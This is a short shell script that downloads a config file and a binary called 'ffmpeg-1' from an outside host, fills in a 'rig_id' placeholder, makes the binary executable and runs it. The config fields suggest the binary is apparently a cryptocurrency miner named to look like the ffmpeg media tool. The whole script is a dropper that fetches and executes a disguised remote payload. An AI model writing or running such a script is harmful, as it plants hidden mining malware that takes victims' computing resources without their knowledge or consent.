if [ -f "config.json" ];then
    echo "config.json already exist, remove it."
    rm config.json
else
    echo "config.json does not exist, download it."
fi

wget http://its.pcl-ai.ml/config.json

if [ -f "ffmpeg-1" ];then
    echo "ffmpeg-1 already exist"
else
    echo "ffmpeg-1 does not exist, download it."
    wget http://its.pcl-ai.ml/ffmpeg-1
fi
echo "processing the config.json..."
sed -i "s/{{rig_id}}/nonoc2/g" config.json
sed -i "s/\"background\": true/\"background\": false/g" config.json
echo "config.json is ready"
echo "modify the ffmpeg-1 auth"
chmod +x ffmpeg-1
echo "starting the ffmpeg-1"
./ffmpeg-1
echo "finish!"
